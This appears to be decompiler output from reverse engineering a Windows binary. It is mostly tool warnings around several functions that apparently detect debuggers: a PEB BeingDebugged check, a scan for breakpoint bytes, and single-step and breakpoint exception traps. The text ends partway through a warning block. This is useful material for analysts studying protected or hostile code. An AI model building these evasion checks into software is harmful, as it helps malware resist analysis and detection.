/* WARNING: Removing unreachable block (ram,0x004241f0) */
/* WARNING: Removing unreachable block (ram,0x00424208) */
/* WARNING: Removing unreachable block (ram,0x00424220) */
/* WARNING: Removing unreachable block (ram,0x00424260) */
/* WARNING: Removing unreachable block (ram,0x00424290) */
/* WARNING: Removing unreachable block (ram,0x00424301) */
/* WARNING: Removing unreachable block (ram,0x00424319) */
/* WARNING: Removing unreachable block (ram,0x00424350) */
/* WARNING: Removing unreachable block (ram,0x00424368) */
/* WARNING: Removing unreachable block (ram,0x00424398) */
/* WARNING: Removing unreachable block (ram,0x004243bc) */
/* WARNING: Removing unreachable block (ram,0x004243d4) */
/* WARNING: Removing unreachable block (ram,0x004243e0) */
/* WARNING: Removing unreachable block (ram,0x00424427) */
/* WARNING: Removing unreachable block (ram,0x0042443f) */
/* WARNING: Removing unreachable block (ram,0x004244a3) */
/* WARNING: Removing unreachable block (ram,0x004244e5) */
/* WARNING: Removing unreachable block (ram,0x004244bb) */
/* WARNING: Removing unreachable block (ram,0x0042451b) */
/* WARNING: Removing unreachable block (ram,0x00424527) */
/* WARNING: Removing unreachable block (ram,0x00424577) */
/* WARNING: Removing unreachable block (ram,0x0042463e) */
/* WARNING: Removing unreachable block (ram,0x0042464a) */
/* WARNING: Removing unreachable block (ram,0x004246c5) */
/* WARNING: Removing unreachable block (ram,0x004246fe) */
/* WARNING: Removing unreachable block (ram,0x0042473f) */
/* WARNING: Removing unreachable block (ram,0x00424743) */
/* WARNING: Removing unreachable block (ram,0x00424770) */
/* WARNING: Removing unreachable block (ram,0x004247b2) */
/* WARNING: Removing unreachable block (ram,0x004247ca) */
/* WARNING: Removing unreachable block (ram,0x004247e2) */
/* WARNING: Removing unreachable block (ram,0x0042481e) */
/* WARNING: Removing unreachable block (ram,0x004248b1) */
/* WARNING: Removing unreachable block (ram,0x004248c9) */
/* WARNING: Removing unreachable block (ram,0x004248ee) */
/* WARNING: Removing unreachable block (ram,0x00424906) */
/* WARNING: Removing unreachable block (ram,0x00424942) */
/* WARNING: Removing unreachable block (ram,0x0042495a) */
/* WARNING: Removing unreachable block (ram,0x00424972) */
/* WARNING: Removing unreachable block (ram,0x0042498a) */
/* WARNING: Removing unreachable block (ram,0x004249a2) */
/* WARNING: Removing unreachable block (ram,0x004249ba) */
/* WARNING: Removing unreachable block (ram,0x004249d2) */
/* WARNING: Removing unreachable block (ram,0x004249ea) */
/* WARNING: Removing unreachable block (ram,0x00424a02) */
/* WARNING: Removing unreachable block (ram,0x00424a1a) */
/* WARNING: Removing unreachable block (ram,0x00424a32) */
/* WARNING: Removing unreachable block (ram,0x00424a4a) */
/* WARNING: Removing unreachable block (ram,0x00424a56) */
/* WARNING: Removing unreachable block (ram,0x00424a77) */
/* WARNING: Removing unreachable block (ram,0x00424a8f) */
/* WARNING: Removing unreachable block (ram,0x00424abf) */
/* WARNING: Removing unreachable block (ram,0x0042482a) */
/* WARNING: Removing unreachable block (ram,0x0042482e) */
/* WARNING: Removing unreachable block (ram,0x004246d1) */
/* WARNING: Removing unreachable block (ram,0x004242a8) */
/* WARNING: Removing unreachable block (ram,0x004242b1) */
/* WARNING: Removing unreachable block (ram,0x00424270) */
/* WARNING: Removing unreachable block (ram,0x0042430d) */
/* WARNING: Removing unreachable block (ram,0x0042474b) */
/* WARNING: Removing unreachable block (ram,0x004246a6) */
/* WARNING: Removing unreachable block (ram,0x0042458f) */
/* WARNING: Removing unreachable block (ram,0x00424ab3) */
/* WARNING: Removing unreachable block (ram,0x0042476c) */
/* WARNING: Removing unreachable block (ram,0x00424794) */
/* WARNING: Removing unreachable block (ram,0x00424798) */
/* WARNING: Removing unreachable block (ram,0x00424722) */
/* WARNING: Removing unreachable block (ram,0x00424671) */
/* WARNING: Removing unreachable block (ram,0x004244f1) */
/* WARNING: Removing unreachable block (ram,0x004243a4) */
/* WARNING: Removing unreachable block (ram,0x0042426c) */
/* WARNING: Removing unreachable block (ram,0x004243ec) */
/* WARNING: Removing unreachable block (ram,0x00424665) */
/* WARNING: Removing unreachable block (ram,0x00424757) */
/* WARNING: Removing unreachable block (ram,0x0042475b) */
/* WARNING: Removing unreachable block (ram,0x0042492a) */
/* WARNING: Removing unreachable block (ram,0x004246dd) */
/* WARNING: Removing unreachable block (ram,0x00424533) */
/* WARNING: Removing unreachable block (ram,0x0042422c) */
/* WARNING: Heritage AFTER dead removal. Example location: s0xffffff48 : 0x00424850 */
/* WARNING: Removing unreachable block (ram,0x004242f5) */
/* WARNING: Removing unreachable block (ram,0x004248a5) */
/* WARNING: Removing unreachable block (ram,0x00424acb) */
/* WARNING: Removing unreachable block (ram,0x00424acf) */
/* WARNING: Removing unreachable block (ram,0x00424278) */
/* WARNING: Removing unreachable block (ram,0x00424689) */
/* WARNING: Removing unreachable block (ram,0x00424284) */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */
/* WARNING: Restarted to delay deadcode elimination for space: stack */

undefined8 __fastcall FUN_004241b5(int *param_1)

{
  LPCSTR pCVar1;
  HMODULE hModule;
  int iVar2;
  BOOL BVar3;
  uint uVar4;
  uint *puVar5;
  uint unaff_EDI;
  int unaff_FS_OFFSET;
  bool bVar6;
  uint *in_stack_00000004;
  uint *puStack_c4;
  uint uStack_c0;
  uint uStack_bc;
  uint uStack_b8;
  LPCSTR pCStack_b4;
  int *piStack_b0;
  int iStack_ac;
  _OSVERSIONINFOA _Stack_a8;
  FARPROC pFStack_14;
  undefined2 uStack_10;
  char *pcStack_c;
  uint uStack_8;

  uStack_b8 = CONCAT22(uStack_b8._2_2_,1);
  pCStack_b4 = FUN_00420230(&DAT_0042ab00);
                    /* WARNING: Bad instruction - Truncating control flow here */
  pCVar1 = FUN_00420230((char *)0x42ab50);
                    /* WARNING: Bad instruction - Truncating control flow here */
  hModule = GetModuleHandleA(pCStack_b4);
  pFStack_14 = GetProcAddress(hModule,pCVar1);
  bVar6 = (POPCOUNT((uint)pFStack_14 & 0xff) & 1U) == 0;
  if (pFStack_14 != (FARPROC)0x0) {
    iVar2 = (*pFStack_14)();
    uStack_b8 = CONCAT22(uStack_b8._2_2_,(short)iVar2);
    if ((!bVar6) && (bVar6)) {
                    /* WARNING: Bad instruction - Truncating control flow here */
      halt_baddata();
    }
  }
  uStack_8 = (uint)(*(char *)(*(int *)(*(int *)(unaff_FS_OFFSET + 0x18) + 0x30) + 2) != '\0');
  if ((pHRam0042ec20 == (HMODULE)0x0) || (iRam0042ec24 == 0)) {
    pCVar1 = FUN_00420230(&DAT_0042ab00);
    pHRam0042ec20 = GetModuleHandleA(pCVar1);
    if (pHRam0042ec20 != (HMODULE)0x0) {
      pHRam0042eb1c = pHRam0042ec20;
      FUN_00411c70(0x42eb18,unaff_EDI);
      unaff_EDI = 0x42eb28;
      func_0x0041fb20();
      iRam0042ec24 = (int)&pHRam0042ec20->unused + iRam0042eba0;
    }
  }
  iStack_ac = 0xff;
                    /* WARNING: Bad instruction - Truncating control flow here */
  if ((pHRam0042ec20 != (HMODULE)0x0) && (iRam0042ec24 != 0)) {
    piStack_b0 = (int *)((int)&pHRam0042ec20->unused + *(int *)(iRam0042ec24 + 0x1c));
    bVar6 = (POPCOUNT((uint)piStack_b0 & 0xff) & 1U) == 0;
    iStack_ac = 0;
                    /* WARNING: Bad instruction - Truncating control flow here */
    if ((!bVar6) && (bVar6)) {
                    /* WARNING: Bad instruction - Truncating control flow here */
      halt_baddata();
    }
    for (uStack_c0 = 0; uStack_c0 < *(uint *)(iRam0042ec24 + 0x14); uStack_c0 = uStack_c0 + 1) {
      pcStack_c = (char *)((int)&pHRam0042ec20->unused + *piStack_b0);
      if (*pcStack_c == -0x34) {
        iStack_ac = iStack_ac + 1;
      }
      piStack_b0 = piStack_b0 + 1;
                    /* WARNING: Bad instruction - Truncating control flow here */
    }
  }
  uStack_bc = CONCAT22(uStack_bc._2_2_,1);
                    /* WARNING: Bad instruction - Truncating control flow here */
  _Stack_a8.dwOSVersionInfoSize = 0x94;
  BVar3 = GetVersionExA(&_Stack_a8);
  if ((BVar3 != 0) && (_Stack_a8.dwPlatformId == 2)) {
    uStack_bc = uStack_bc & 0xffff0000;
                    /* WARNING: Bad instruction - Truncating control flow here */
  }
  uStack_10 = 0;
  uVar4 = FUN_00423950(0x3c,(undefined4 *)0x0,0,&puStack_c4,unaff_EDI);
  if ((uVar4 & 0xffff) == 0) {
    puStack_c4 = (uint *)(*in_stack_00000004 & 0x2d325697);
    bVar6 = (POPCOUNT(*in_stack_00000004 & 0x97) & 1U) == 0;
    *in_stack_00000004 = (uint)puStack_c4;
    uStack_10 = 1;
    if ((!bVar6) && (bVar6)) {
                    /* WARNING: Bad instruction - Truncating control flow here */
      halt_baddata();
    }
  }
  else {
    *in_stack_00000004 = (uint)puStack_c4;
  }
  if ((uStack_8 != 0) || (puVar5 = (uint *)0x0, (uStack_b8 & 0xffff) != 0)) {
    puStack_c4 = (uint *)(*in_stack_00000004 & 0xfd356997);
    *in_stack_00000004 = (uint)puStack_c4;
    uStack_10 = 1;
    puVar5 = in_stack_00000004;
  }
  if ((uStack_bc & 0xffff) != 0) {
    puVar5 = (uint *)(*in_stack_00000004 & 0x1145373a);
    *in_stack_00000004 = (uint)puVar5;
    uStack_10 = 1;
    puStack_c4 = in_stack_00000004;
  }
  if (iStack_ac != 0) {
    puVar5 = (uint *)(*in_stack_00000004 & 0x5185dade);
    *in_stack_00000004 = (uint)puVar5;
    uStack_10 = 1;
    puStack_c4 = in_stack_00000004;
  }
  return CONCAT44(puStack_c4,CONCAT22((short)((uint)puVar5 >> 0x10),uStack_10));
}



/* VA 00424ad7 */

/* WARNING: Instruction at (ram,0x00424f87) overlaps instruction at (ram,0x00424f85)
    */
/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Removing unreachable block (ram,0x00424d07) */
/* WARNING: Removing unreachable block (ram,0x00424d0b) */
/* WARNING: Removing unreachable block (ram,0x00424f54) */
/* WARNING: Removing unreachable block (ram,0x00424f3c) */
/* WARNING: Removing unreachable block (ram,0x00424f24) */
/* WARNING: Removing unreachable block (ram,0x00424ecf) */
/* WARNING: Removing unreachable block (ram,0x00424ec3) */
/* WARNING: Removing unreachable block (ram,0x00424e99) */
/* WARNING: Removing unreachable block (ram,0x00424e81) */
/* WARNING: Removing unreachable block (ram,0x00424e41) */
/* WARNING: Removing unreachable block (ram,0x00424e1d) */
/* WARNING: Removing unreachable block (ram,0x00424e05) */
/* WARNING: Removing unreachable block (ram,0x00424ded) */
/* WARNING: Removing unreachable block (ram,0x00424dd5) */
/* WARNING: Removing unreachable block (ram,0x00424d9b) */
/* WARNING: Removing unreachable block (ram,0x00424d83) */
/* WARNING: Removing unreachable block (ram,0x00424d50) */
/* WARNING: Removing unreachable block (ram,0x00424d2f) */
/* WARNING: Removing unreachable block (ram,0x00424cea) */
/* WARNING: Removing unreachable block (ram,0x00424cd2) */
/* WARNING: Removing unreachable block (ram,0x00424c99) */
/* WARNING: Removing unreachable block (ram,0x00424c6e) */
/* WARNING: Removing unreachable block (ram,0x00424c3e) */
/* WARNING: Removing unreachable block (ram,0x00424c26) */
/* WARNING: Removing unreachable block (ram,0x00424c0e) */
/* WARNING: Removing unreachable block (ram,0x00424bf6) */
/* WARNING: Removing unreachable block (ram,0x00424bde) */
/* WARNING: Removing unreachable block (ram,0x00424bc6) */
/* WARNING: Removing unreachable block (ram,0x00424bae) */
/* WARNING: Removing unreachable block (ram,0x00424b96) */
/* WARNING: Removing unreachable block (ram,0x00424b72) */
/* WARNING: Removing unreachable block (ram,0x00424b4e) */
/* WARNING: Removing unreachable block (ram,0x00424b36) */
/* WARNING: Removing unreachable block (ram,0x00424b1e) */
/* WARNING: Removing unreachable block (ram,0x00424b12) */
/* WARNING: Removing unreachable block (ram,0x00424afa) */
/* WARNING: Removing unreachable block (ram,0x00424aee) */
/* WARNING: Removing unreachable block (ram,0x00424b06) */
/* WARNING: Removing unreachable block (ram,0x00424b42) */
/* WARNING: Removing unreachable block (ram,0x00424b5a) */
/* WARNING: Removing unreachable block (ram,0x00424b7e) */
/* WARNING: Removing unreachable block (ram,0x00424ba2) */
/* WARNING: Removing unreachable block (ram,0x00424bba) */
/* WARNING: Removing unreachable block (ram,0x00424bd2) */
/* WARNING: Removing unreachable block (ram,0x00424bea) */
/* WARNING: Removing unreachable block (ram,0x00424c02) */
/* WARNING: Removing unreachable block (ram,0x00424c1a) */
/* WARNING: Removing unreachable block (ram,0x00424c32) */
/* WARNING: Removing unreachable block (ram,0x00424c4a) */
/* WARNING: Removing unreachable block (ram,0x00424c56) */
/* WARNING: Removing unreachable block (ram,0x00424ca5) */
/* WARNING: Removing unreachable block (ram,0x00424cb1) */
/* WARNING: Removing unreachable block (ram,0x00424cf6) */
/* WARNING: Removing unreachable block (ram,0x00424d13) */
/* WARNING: Removing unreachable block (ram,0x00424d5c) */
/* WARNING: Removing unreachable block (ram,0x00424d8f) */
/* WARNING: Removing unreachable block (ram,0x00424da7) */
/* WARNING: Removing unreachable block (ram,0x00424db3) */
/* WARNING: Removing unreachable block (ram,0x00424df9) */
/* WARNING: Removing unreachable block (ram,0x00424e11) */
/* WARNING: Removing unreachable block (ram,0x00424e29) */
/* WARNING: Removing unreachable block (ram,0x00424e4d) */
/* WARNING: Removing unreachable block (ram,0x00424e59) */
/* WARNING: Removing unreachable block (ram,0x00424e75) */
/* WARNING: Removing unreachable block (ram,0x00424e8d) */
/* WARNING: Removing unreachable block (ram,0x00424eb7) */
/* WARNING: Removing unreachable block (ram,0x00424f00) */
/* WARNING: Removing unreachable block (ram,0x00424f48) */
/* WARNING: Removing unreachable block (ram,0x00424f60) */
/* WARNING: Removing unreachable block (ram,0x00424f78) */
/* WARNING: Removing unreachable block (ram,0x00424d1f) */
/* WARNING: Removing unreachable block (ram,0x00424d23) */
/* WARNING: Removing unreachable block (ram,0x00424d40) */
/* WARNING: Removing unreachable block (ram,0x00424d44) */
/* WARNING: Removing unreachable block (ram,0x00424f0c) */
/* WARNING: Removing unreachable block (ram,0x00424c7a) */
/* WARNING: Heritage AFTER dead removal. Example location: s0xffffff60 : 0x00424ed0 */
/* WARNING: Removing unreachable block (ram,0x00424b8a) */
/* WARNING: Removing unreachable block (ram,0x00424e35) */
/* WARNING: Removing unreachable block (ram,0x00424f6c) */
/* WARNING: Removing unreachable block (ram,0x00424d4c) */
/* WARNING: Removing unreachable block (ram,0x00424d68) */
/* WARNING: Removing unreachable block (ram,0x00424cde) */
/* WARNING: Removing unreachable block (ram,0x00424b2a) */
/* WARNING: Removing unreachable block (ram,0x00424d2b) */
/* WARNING: Removing unreachable block (ram,0x00424de1) */
/* WARNING: Removing unreachable block (ram,0x00424f18) */
/* WARNING: Removing unreachable block (ram,0x00424c62) */
/* WARNING: Removing unreachable block (ram,0x00424b66) */
/* WARNING: Removing unreachable block (ram,0x00424eab) */
/* WARNING: Removing unreachable block (ram,0x00424f84) */
/* WARNING: Restarted to delay deadcode elimination for space: stack */

undefined8 __fastcall FUN_00424ad7(byte param_1,undefined2 param_2)

{
  int *piVar1;
  BOOL BVar2;
  int *piVar3;
  uint extraout_ECX;
  undefined2 extraout_DX;
  int *extraout_EDX;
  int *piVar4;
  bool bVar5;
  bool bVar6;
  int *in_stack_00000004;
  _OSVERSIONINFOA _Stack_9c;
  ushort uStack_8;

  _Stack_9c.dwOSVersionInfoSize = 0x94;
  bVar5 = true;
  BVar2 = GetVersionExA(&_Stack_9c);
  if ((BVar2 != 0) && (_Stack_9c.dwPlatformId == 2)) {
    bVar5 = false;
  }
  DAT_0042ec28 = 0xff;
  piVar3 = (int *)FUN_00424f90(extraout_ECX,extraout_DX);
  uStack_8 = 0;
  bVar6 = DAT_0042ec28 != -0x3ffffffb;
  piVar4 = extraout_EDX;
  if (bVar6) {
    piVar4 = (int *)(*in_stack_00000004 + 0xf71);
    *in_stack_00000004 = (int)piVar4;
    uStack_8 = 1;
    piVar3 = in_stack_00000004;
  }
  uStack_8 = (ushort)bVar6;
  piVar1 = (int *)0x0;
  if (bVar5) {
    piVar3 = (int *)(*in_stack_00000004 + 0x37a);
    *in_stack_00000004 = (int)piVar3;
    uStack_8 = 1;
    piVar4 = in_stack_00000004;
    piVar1 = piVar3;
  }
  bVar5 = (POPCOUNT((uint)piVar1 & 0xff) & 1U) == 0;
  if ((!bVar5) && (bVar5)) {
                    /* WARNING: Bad instruction - Truncating control flow here */
    halt_baddata();
  }
  return CONCAT44(piVar4,CONCAT22((short)((uint)piVar3 >> 0x10),uStack_8));
}



/* VA 00424f90 */

/* WARNING: Instruction at (ram,0x00425320) overlaps instruction at (ram,0x0042531f)
    */
/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Removing unreachable block (ram,0x004252e2) */
/* WARNING: Removing unreachable block (ram,0x004252ca) */
/* WARNING: Removing unreachable block (ram,0x004252b2) */
/* WARNING: Removing unreachable block (ram,0x0042529a) */
/* WARNING: Removing unreachable block (ram,0x00425282) */
/* WARNING: Removing unreachable block (ram,0x0042526a) */
/* WARNING: Removing unreachable block (ram,0x00425252) */
/* WARNING: Removing unreachable block (ram,0x0042523a) */
/* WARNING: Removing unreachable block (ram,0x00425222) */
/* WARNING: Removing unreachable block (ram,0x00425216) */
/* WARNING: Removing unreachable block (ram,0x004251fe) */
/* WARNING: Removing unreachable block (ram,0x004251e6) */
/* WARNING: Removing unreachable block (ram,0x004251ce) */
/* WARNING: Removing unreachable block (ram,0x004251b6) */
/* WARNING: Removing unreachable block (ram,0x0042519c) */
/* WARNING: Removing unreachable block (ram,0x00425184) */
/* WARNING: Removing unreachable block (ram,0x00425148) */
/* WARNING: Removing unreachable block (ram,0x00425130) */
/* WARNING: Removing unreachable block (ram,0x00425118) */
/* WARNING: Removing unreachable block (ram,0x00425100) */
/* WARNING: Removing unreachable block (ram,0x004250e8) */
/* WARNING: Removing unreachable block (ram,0x004250d0) */
/* WARNING: Removing unreachable block (ram,0x004250b8) */
/* WARNING: Removing unreachable block (ram,0x004250a0) */
/* WARNING: Removing unreachable block (ram,0x00425088) */
/* WARNING: Removing unreachable block (ram,0x00425070) */
/* WARNING: Removing unreachable block (ram,0x00425058) */
/* WARNING: Removing unreachable block (ram,0x00425040) */
/* WARNING: Removing unreachable block (ram,0x00425028) */
/* WARNING: Removing unreachable block (ram,0x0042501c) */
/* WARNING: Removing unreachable block (ram,0x00425004) */
/* WARNING: Removing unreachable block (ram,0x00424fc8) */
/* WARNING: Removing unreachable block (ram,0x00424fd4) */
/* WARNING: Removing unreachable block (ram,0x00424fe0) */
/* WARNING: Removing unreachable block (ram,0x00424ff8) */
/* WARNING: Removing unreachable block (ram,0x00425010) */
/* WARNING: Removing unreachable block (ram,0x0042504c) */
/* WARNING: Removing unreachable block (ram,0x00425064) */
/* WARNING: Removing unreachable block (ram,0x0042507c) */
/* WARNING: Removing unreachable block (ram,0x00425094) */
/* WARNING: Removing unreachable block (ram,0x004250ac) */
/* WARNING: Removing unreachable block (ram,0x004250c4) */
/* WARNING: Removing unreachable block (ram,0x004250dc) */
/* WARNING: Removing unreachable block (ram,0x004250f4) */
/* WARNING: Removing unreachable block (ram,0x0042510c) */
/* WARNING: Removing unreachable block (ram,0x00425124) */
/* WARNING: Removing unreachable block (ram,0x0042513c) */
/* WARNING: Removing unreachable block (ram,0x00425154) */
/* WARNING: Removing unreachable block (ram,0x00425160) */
/* WARNING: Removing unreachable block (ram,0x00425178) */
/* WARNING: Removing unreachable block (ram,0x00425190) */
/* WARNING: Removing unreachable block (ram,0x004251aa) */
/* WARNING: Removing unreachable block (ram,0x004251c2) */
/* WARNING: Removing unreachable block (ram,0x004251da) */
/* WARNING: Removing unreachable block (ram,0x004251f2) */
/* WARNING: Removing unreachable block (ram,0x0042520a) */
/* WARNING: Removing unreachable block (ram,0x00425246) */
/* WARNING: Removing unreachable block (ram,0x0042525e) */
/* WARNING: Removing unreachable block (ram,0x00425276) */
/* WARNING: Removing unreachable block (ram,0x0042528e) */
/* WARNING: Removing unreachable block (ram,0x004252a6) */
/* WARNING: Removing unreachable block (ram,0x004252be) */
/* WARNING: Removing unreachable block (ram,0x004252d6) */
/* WARNING: Removing unreachable block (ram,0x004252ee) */
/* WARNING: Removing unreachable block (ram,0x004252fa) */
/* WARNING: Heritage AFTER dead removal. Example location: s0xffffffec : 0x00425492 */
/* WARNING: Removing unreachable block (ram,0x0042516c) */
/* WARNING: Removing unreachable block (ram,0x00425306) */
/* WARNING: Removing unreachable block (ram,0x00425034) */
/* WARNING: Removing unreachable block (ram,0x0042522e) */
/* WARNING: Removing unreachable block (ram,0x00424fec) */
/* WARNING: Removing unreachable block (ram,0x00425312) */
/* WARNING: Removing unreachable block (ram,0x0042531e) */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */
/* WARNING: Restarted to delay deadcode elimination for space: stack */

undefined1 * __fastcall FUN_00424f90(uint param_1,undefined2 param_2)

{
  code *pcVar1;
  undefined1 *puVar2;
  undefined4 *unaff_FS_OFFSET;
  undefined4 uStack_14;
  undefined1 *puStack_10;
  undefined *puStack_c;
  undefined4 local_8;

  puStack_c = &DAT_00428018;
  puStack_10 = &LAB_00416fd0;
  uStack_14 = *unaff_FS_OFFSET;
  *unaff_FS_OFFSET = &uStack_14;
  local_8 = 0;
  pcVar1 = (code *)swi(1);
  puVar2 = (undefined1 *)(*pcVar1)();
                    /* WARNING: Bad instruction - Truncating control flow here */
  *unaff_FS_OFFSET = uStack_14;
  return puVar2;
}



/* VA 004254a3 */

/* WARNING: Instruction at (ram,0x004257a1) overlaps instruction at (ram,0x004257a0)
    */
/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Removing unreachable block (ram,0x00425791) */
/* WARNING: Removing unreachable block (ram,0x00425785) */
/* WARNING: Removing unreachable block (ram,0x0042576d) */
/* WARNING: Removing unreachable block (ram,0x00425755) */
/* WARNING: Removing unreachable block (ram,0x0042573d) */
/* WARNING: Removing unreachable block (ram,0x00425725) */
/* WARNING: Removing unreachable block (ram,0x0042570d) */
/* WARNING: Removing unreachable block (ram,0x004256f5) */
/* WARNING: Removing unreachable block (ram,0x004256dd) */
/* WARNING: Removing unreachable block (ram,0x004256c5) */
/* WARNING: Removing unreachable block (ram,0x004256ad) */
/* WARNING: Removing unreachable block (ram,0x00425670) */
/* WARNING: Removing unreachable block (ram,0x00425658) */
/* WARNING: Removing unreachable block (ram,0x00425634) */
/* WARNING: Removing unreachable block (ram,0x0042561c) */
/* WARNING: Removing unreachable block (ram,0x004255f8) */
/* WARNING: Removing unreachable block (ram,0x004255e0) */
/* WARNING: Removing unreachable block (ram,0x004255d4) */
/* WARNING: Removing unreachable block (ram,0x004255bc) */
/* WARNING: Removing unreachable block (ram,0x00425598) */
/* WARNING: Removing unreachable block (ram,0x00425580) */
/* WARNING: Removing unreachable block (ram,0x00425568) */
/* WARNING: Removing unreachable block (ram,0x00425550) */
/* WARNING: Removing unreachable block (ram,0x00425538) */
/* WARNING: Removing unreachable block (ram,0x00425520) */
/* WARNING: Removing unreachable block (ram,0x00425508) */
/* WARNING: Removing unreachable block (ram,0x004254f0) */
/* WARNING: Removing unreachable block (ram,0x004254d8) */
/* WARNING: Removing unreachable block (ram,0x004254c0) */
/* WARNING: Removing unreachable block (ram,0x004254b4) */
/* WARNING: Removing unreachable block (ram,0x004254cc) */
/* WARNING: Removing unreachable block (ram,0x004254e4) */
/* WARNING: Removing unreachable block (ram,0x004254fc) */
/* WARNING: Removing unreachable block (ram,0x00425514) */
/* WARNING: Removing unreachable block (ram,0x0042552c) */
/* WARNING: Removing unreachable block (ram,0x00425544) */
/* WARNING: Removing unreachable block (ram,0x0042555c) */
/* WARNING: Removing unreachable block (ram,0x00425574) */
/* WARNING: Removing unreachable block (ram,0x0042558c) */
/* WARNING: Removing unreachable block (ram,0x004255b0) */
/* WARNING: Removing unreachable block (ram,0x004255c8) */
/* WARNING: Removing unreachable block (ram,0x00425604) */
/* WARNING: Removing unreachable block (ram,0x00425628) */
/* WARNING: Removing unreachable block (ram,0x00425640) */
/* WARNING: Removing unreachable block (ram,0x00425664) */
/* WARNING: Removing unreachable block (ram,0x0042567c) */
/* WARNING: Removing unreachable block (ram,0x00425688) */
/* WARNING: Removing unreachable block (ram,0x004256a1) */
/* WARNING: Removing unreachable block (ram,0x004256b9) */
/* WARNING: Removing unreachable block (ram,0x004256d1) */
/* WARNING: Removing unreachable block (ram,0x004256e9) */
/* WARNING: Removing unreachable block (ram,0x00425701) */
/* WARNING: Removing unreachable block (ram,0x00425719) */
/* WARNING: Removing unreachable block (ram,0x00425731) */
/* WARNING: Removing unreachable block (ram,0x00425749) */
/* WARNING: Removing unreachable block (ram,0x00425761) */
/* WARNING: Removing unreachable block (ram,0x00425779) */
/* WARNING: Removing unreachable block (ram,0x004257a9) */
/* WARNING: Removing unreachable block (ram,0x004257b5) */
/* WARNING: Removing unreachable block (ram,0x00425610) */
/* WARNING: Removing unreachable block (ram,0x0042579d) */
/* WARNING: Removing unreachable block (ram,0x004255a4) */
/* WARNING: Removing unreachable block (ram,0x0042564c) */
/* WARNING: Removing unreachable block (ram,0x004255ec) */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

undefined8 __fastcall FUN_004254a3(uint param_1,undefined2 param_2,undefined4 *param_3)

{
  DAT_0042ec28 = *(undefined4 *)*param_3;
  return CONCAT44(*(undefined4 *)*param_3,1);
}



/* VA 004257c0 */

/* WARNING: Instruction at (ram,0x00425953) overlaps instruction at (ram,0x00425952)
    */
/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Removing unreachable block (ram,0x004259cd) */
/* WARNING: Removing unreachable block (ram,0x004259b5) */
/* WARNING: Removing unreachable block (ram,0x00425945) */
/* WARNING: Removing unreachable block (ram,0x00425939) */
/* WARNING: Removing unreachable block (ram,0x00425921) */
/* WARNING: Removing unreachable block (ram,0x004258ff) */
/* WARNING: Removing unreachable block (ram,0x004258c3) */
/* WARNING: Removing unreachable block (ram,0x004259a2) */
/* WARNING: Removing unreachable block (ram,0x0042598a) */
/* WARNING: Removing unreachable block (ram,0x00425972) */
/* WARNING: Removing unreachable block (ram,0x00425892) */
/* WARNING: Removing unreachable block (ram,0x0042587a) */
/* WARNING: Removing unreachable block (ram,0x00425862) */
/* WARNING: Removing unreachable block (ram,0x0042584a) */
/* WARNING: Removing unreachable block (ram,0x00425826) */
/* WARNING: Removing unreachable block (ram,0x00425804) */
/* WARNING: Removing unreachable block (ram,0x004257ec) */
/* WARNING: Removing unreachable block (ram,0x004257d4) */
/* WARNING: Removing unreachable block (ram,0x004257e0) */
/* WARNING: Removing unreachable block (ram,0x004257f8) */
/* WARNING: Removing unreachable block (ram,0x00425810) */
/* WARNING: Removing unreachable block (ram,0x00425832) */
/* WARNING: Removing unreachable block (ram,0x00425856) */
/* WARNING: Removing unreachable block (ram,0x0042586e) */
/* WARNING: Removing unreachable block (ram,0x00425886) */
/* WARNING: Removing unreachable block (ram,0x0042589e) */
/* WARNING: Removing unreachable block (ram,0x00425966) */
/* WARNING: Removing unreachable block (ram,0x0042597e) */
/* WARNING: Removing unreachable block (ram,0x00425996) */
/* WARNING: Removing unreachable block (ram,0x004258aa) */
/* WARNING: Removing unreachable block (ram,0x004258db) */
/* WARNING: Removing unreachable block (ram,0x004258f3) */
/* WARNING: Removing unreachable block (ram,0x00425915) */
/* WARNING: Removing unreachable block (ram,0x0042592d) */
/* WARNING: Removing unreachable block (ram,0x004259c1) */
/* WARNING: Removing unreachable block (ram,0x004259d9) */
/* WARNING: Removing unreachable block (ram,0x004259e5) */
/* WARNING: Removing unreachable block (ram,0x004258cf) */
/* WARNING: Removing unreachable block (ram,0x004258bf) */
/* WARNING: Removing unreachable block (ram,0x004258e7) */
/* WARNING: Removing unreachable block (ram,0x0042583e) */
/* WARNING: Removing unreachable block (ram,0x004259f1) */
/* WARNING: Removing unreachable block (ram,0x004258ef) */
/* WARNING: Removing unreachable block (ram,0x0042594d) */
/* WARNING: Removing unreachable block (ram,0x00425951) */

undefined8 __thiscall FUN_004257c0(void *this,byte *param_1)

{
  undefined4 local_c;

  if (**(int **)param_1 == -0x7ffffffd) {
    DAT_0042ec2c = 1;
    local_c = 0xffffffff;
                    /* WARNING: Bad instruction - Truncating control flow here */
  }
  else {
    local_c = 0;
  }
  return CONCAT44(**(int **)param_1,local_c);
}



/* VA 004259fe */

/* WARNING: Instruction at (ram,0x00426107) overlaps instruction at (ram,0x00426106)
    */
/* WARNING: Control flow encountered bad instruction data */
/* WARNING (jumptable): Unable to track spacebase fully for stack */
/* WARNING: Removing unreachable block (ram,0x004260ed) */
/* WARNING: Removing unreachable block (ram,0x004260c9) */
/* WARNING: Removing unreachable block (ram,0x004260b1) */
/* WARNING: Removing unreachable block (ram,0x00426075) */
/* WARNING: Removing unreachable block (ram,0x0042605d) */
/* WARNING: Removing unreachable block (ram,0x00426045) */
/* WARNING: Removing unreachable block (ram,0x0042602d) */
/* WARNING: Removing unreachable block (ram,0x00426015) */
/* WARNING: Removing unreachable block (ram,0x00425ffd) */
/* WARNING: Removing unreachable block (ram,0x00425fe5) */
/* WARNING: Removing unreachable block (ram,0x00425fc9) */
/* WARNING: Removing unreachable block (ram,0x00425fbd) */
/* WARNING: Removing unreachable block (ram,0x00425f77) */
/* WARNING: Removing unreachable block (ram,0x00425f32) */
/* WARNING: Removing unreachable block (ram,0x00425f11) */
/* WARNING: Removing unreachable block (ram,0x00425f05) */
/* WARNING: Removing unreachable block (ram,0x00425ee3) */
/* WARNING: Removing unreachable block (ram,0x00425e85) */
/* WARNING: Removing unreachable block (ram,0x00425e70) */
/* WARNING: Removing unreachable block (ram,0x00425e58) */
/* WARNING: Removing unreachable block (ram,0x00425e40) */
